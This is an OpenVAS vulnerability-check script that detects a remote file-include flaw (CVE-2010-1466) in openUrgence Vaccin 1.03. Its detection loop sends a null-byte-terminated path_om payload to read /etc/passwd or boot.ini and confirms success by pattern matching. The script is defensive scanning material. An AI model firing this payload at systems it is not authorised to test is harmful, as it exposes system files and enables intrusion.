###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openUrgence_39412.nasl 14 2013-10-27 12:33:37Z jan $
#
# openUrgence Vaccin Multiple Remote File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "openUrgence Vaccin is prone to multiple remote file-include
vulnerabilities because the application fails to sufficiently sanitize
user-supplied input.

Exploiting these issues may allow a remote attacker to obtain
sensitive information or compromise the application and the underlying
computer; other attacks are also possible.

openUrgence Vaccin 1.03 is vulnerable; other versions may also
be affected.

NOTE: This BID previously also documented a local file-include
      vulnerability affecting the 'dsn[phptype]' parameter of the
      'scr/soustab.php' script. That issue is already covered in BID
      23505 (openMairie Multiple Applications 'dsn[phptype]' Parameter
      Local File Include Vulnerability).";


if (description)
{
 script_id(100627);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-05-06 13:19:12 +0200 (Thu, 06 May 2010)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2010-1466");
 script_bugtraq_id(39412,23505);

 script_name("openUrgence Vaccin Multiple Remote File Include Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39412");
 script_xref(name : "URL" , value : "https://adullact.net/projects/openurgence/");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if openUrgence Vaccin is prone to multiple remote file-include vulnerabilities");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/ou",cgi_dirs());
files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir,"/gen/obj/collectivite.class.php?path_om=/",files[file],"%00"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_hole(port:port);
      exit(0);

    }
  }  
}

exit(0);
